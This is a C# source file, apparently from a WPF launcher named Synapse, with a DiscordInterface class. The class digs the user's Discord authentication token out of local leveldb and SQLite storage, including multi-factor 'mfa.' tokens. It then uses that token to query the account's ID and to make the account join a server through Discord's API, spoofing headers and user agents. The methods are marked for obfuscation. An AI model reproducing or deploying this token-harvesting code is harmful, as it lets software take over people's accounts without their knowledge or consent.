using System;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using RestSharp;

namespace Synapse_UI_WPF.Interfaces
{
    public static class DiscordInterface
    {
        public class DiscordResponse
        {
            public bool Exists;
            public string Token;

            public DiscordResponse(bool _Exists, string _Token = "")
            {
                Exists = _Exists;
                Token = _Token;
            }
        }

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public static DiscordResponse GetAlternateToken()
        {
            var LevelDb = Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "leveldb");
            var DbTrigger = false;
            if (!Directory.Exists(LevelDb)) return new DiscordResponse(false);

            foreach (var LFile in Directory.EnumerateFiles(LevelDb, "*.*", SearchOption.AllDirectories).Where(s => s.EndsWith(".ldb") || s.EndsWith(".log")))
            {
                var Src = File.ReadAllLines(LFile);
                foreach (var Line in Src)
                {
                    if (!Line.Contains("token") && !Line.Contains("oken"))
                    {
                        if (!DbTrigger) continue;
                        DbTrigger = false;
                    }
                    else
                    {
                        DbTrigger = true;
                    }

                    var Filter = Regex.Replace(Line, "[^0-9a-zA-Z\\.\\-_\"=]+", "");
                    var TokenRegex = Regex.Matches(Filter, "\"(.+?)\"");

                    foreach (Match Mat in TokenRegex)
                    {
                        var Token = Mat.Groups[1].Value.Replace("\"", "");

                        if (Token.StartsWith("mfa."))
                        {
                            return new DiscordResponse(true, Token);
                        }

                        try
                        {
                            var Split = Token.Split('.');
                            if (Split.Length < 2) continue;
                            var UserId = Encoding.UTF8.GetString(Convert.FromBase64String(Split[0]));
                            if (ulong.TryParse(UserId, out _))
                            {
                                return new DiscordResponse(true, Token);
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }

            return new DiscordResponse(false);
        }

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public static DiscordResponse GetToken()
        {
            try
            {
                var LocalStorage = Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "https_discordapp.com_0.localstorage");
                if (!File.Exists(LocalStorage)) return GetAlternateToken();

                string Token;

                using (var SQLite = new SQLiteConnection("URI=file:" + LocalStorage))
                {
                    SQLite.Open();

                    var Command = new SQLiteCommand("SELECT value FROM ItemTable WHERE key=\"token\"", SQLite);
                    var Value = (byte[]) Command.ExecuteScalar();

                    var FList = Value.Where(Val => Val != 0).ToArray();
                    Token = Encoding.UTF8.GetString(FList).Trim('"');

                    SQLite.Close();
                }

                return Token.Length != 0 ? new DiscordResponse(true, Token) : new DiscordResponse(false);
            }
            catch (Exception)
            {
                return new DiscordResponse(false);
            }
        }

        private static readonly Random Rnd = new Random();

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        private static string UserAgent = "";

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        private static string GetUserAgent()
        {
            if (UserAgent.Length != 0) return UserAgent;

            switch (Rnd.Next(1, 5))
            {
                case 1:
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36";
                    break;
                case 2:
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0";
                    break;
                case 3:
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134";
                    break;
                case 4:
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36 Viv/2.1.1337.36";
                    break;
                default:
                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36";
                    break;
            }

            return UserAgent;
        }

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public static ulong GetId(string Token)
        {
            var Rest = new RestClient("https://discordapp.com/api/v6/") { UserAgent = GetUserAgent(), Proxy = null };

            var Request = new RestRequest("users/@me");
            Request.AddHeader("Authorization", Token);

            var Result = Rest.Execute(Request);
            var JsonObj = JObject.Parse(Result.Content);

            return ulong.Parse(JsonObj["id"].Value<string>());
        }

        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public static void JoinServer(string Token, string Invite, LoadWindow Window)
        {
            var Rest = new RestClient("https://discordapp.com/api/v6/") { UserAgent = GetUserAgent(), Proxy = null };

            WebInterface.VerifyWebsite(Window);

            var Request = new RestRequest("invite/" + Invite, Method.POST);
            Request.AddHeader("Authorization", Token);
            Request.AddHeader("Origin", "https:///discordapp.com");
            Request.AddHeader("Referer", "https:///discord.gg/" + Invite);

            Rest.Execute(Request);
        }
    }
}
